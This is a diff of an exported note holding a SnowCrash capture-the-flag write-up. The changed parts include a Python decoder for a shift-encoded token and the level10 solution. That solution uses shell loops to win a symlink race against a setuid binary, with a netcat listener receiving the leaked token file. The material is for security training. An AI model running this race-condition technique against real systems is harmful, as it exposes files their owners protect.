@@ -6,14 +6,14 @@
         <meta name="viewport" content="width=device-width, initial-scale=1">
         <meta name="bear-note-unique-identifier" content="A9F14167-BC80-4D87-82D2-C585ED137FF9-53786-00000DF6E4523D00">
         <meta name="created" content="2021-06-24T17:47:42+0300"/>
-        <meta name="modified" content="2021-06-24T20:32:08+0300"/>
-        <meta name="tags" content="cs"/>
+        <meta name="modified" content="2021-08-02T18:12:59+0300"/>
+        <meta name="tags" content="cs/school21, cs"/>
         <meta name="last device" content="Alexander’s MacBook Air"/>
     </head>
     <body>
         <div class="note-wrapper">
             <h1 id="SnowCrash – write up">SnowCrash – write up</h1>
-<p><span class='hashtag'>#cs</span></p>
+<p><span class='hashtag'>#cs/school21</span></p>
 <br>
 <h2 id="Level 00 (vulnerable file with a simple cipher)">Level 00 (vulnerable file with a simple cipher)</h2>
 <p>We begin by searching for files owned by user <code class='code-inline'>flag00</code></p>
@@ -13502,8 +13502,9 @@ tpmhr</code></pre>
 <p><br></p>
 <p>It looks like each character is encoded using an incremental shift. If that is so, we can decode the encrypted token with the following program</p>
 <br>
-<pre><code class='code-multiline' lang='python'>f <span class="sf_code_operator">=</span> <span class="sf_code_builtin">open</span><span class="sf_code_punctuation">(</span><span class="sf_code_string">'/home/user/level09/token'</span><span class="sf_code_punctuation">)</span>
-tmp <span class="sf_code_operator">=</span> f<span class="sf_code_punctuation">.</span>read
+<pre><code class='code-multiline' lang='python'><span class="sf_code_keyword">import</span> sys
+f <span class="sf_code_operator">=</span> sys<span class="sf_code_punctuation">.</span>stdin
+tmp <span class="sf_code_operator">=</span> f<span class="sf_code_punctuation">.</span>read<span class="sf_code_punctuation">()</span>
 res <span class="sf_code_operator">=</span> <span class="sf_code_string">''</span>
 i <span class="sf_code_operator">=</span> <span class="sf_code_number">0</span>
 <span class="sf_code_keyword">while</span> i <span class="sf_code_operator">&lt;</span> <span class="sf_code_punctuation">(</span><span class="sf_code_builtin">len</span><span class="sf_code_punctuation">(</span>tmp<span class="sf_code_punctuation">)</span> <span class="sf_code_operator">-</span> <span class="sf_code_number">1</span><span class="sf_code_punctuation">):</span>
@@ -13552,9 +13553,9 @@ You don't have access to %s
 <span class="sf_code_operator">&gt;</span> <span class="sf_code_function">chmod</span> 755 <span class="sf_code_keyword">.</span> <span class="sf_code_operator">&&</span> <span class="sf_code_keyword">echo</span> <span class="sf_code_string">"HELLO"</span> <span class="sf_code_operator">&gt;</span> <span class="sf_code_function">test</span>
 <span class="sf_code_operator">&gt;</span> <span class="sf_code_keyword">while</span> <span class="sf_code_boolean">true</span><span class="sf_code_punctuation">;</span> <span class="sf_code_keyword">do</span> <span class="sf_code_function">ln</span> -s -f <span class="sf_code_function">test</span> <span class="sf_code_function">link</span><span class="sf_code_punctuation">;</span> <span class="sf_code_function">ln</span> -s -f token <span class="sf_code_function">link</span><span class="sf_code_punctuation">;</span> <span class="sf_code_keyword">done</span>
 <span class="sf_code_comment"># In another terminal window</span>
-<span class="sf_code_operator">&gt;</span> <span class="sf_code_keyword">while</span> <span class="sf_code_boolean">true</span><span class="sf_code_punctuation">;</span> <span class="sf_code_keyword">do</span> ./level10 <span class="sf_code_function">link</span> 192.168.8.111<span class="sf_code_punctuation">;</span> <span class="sf_code_keyword">done</span></code></pre>
+<span class="sf_code_operator">&gt;</span> <span class="sf_code_keyword">while</span> <span class="sf_code_boolean">true</span><span class="sf_code_punctuation">;</span> <span class="sf_code_keyword">do</span> ./level10 <span class="sf_code_function">link</span> 127.0.0.1<span class="sf_code_punctuation">;</span> <span class="sf_code_keyword">done</span></code></pre>
 <p><br></p>
-<p>At the same time, we try to connect to the server from our local machine</p>
+<p>At the same time, we try to connect to <code class='code-inline'>localhost</code> within our local machine</p>
 <br>
 <pre><code class='code-multiline' lang='bash'><span class="sf_code_operator">&gt;</span> <span class="sf_code_keyword">while</span> <span class="sf_code_boolean">true</span><span class="sf_code_punctuation">;</span> <span class="sf_code_keyword">do</span> nc -l 6969 <span class="sf_code_punctuation">;</span> <span class="sf_code_keyword">done</span>
 .*<span class="sf_code_punctuation">(</span> <span class="sf_code_punctuation">)</span>*.
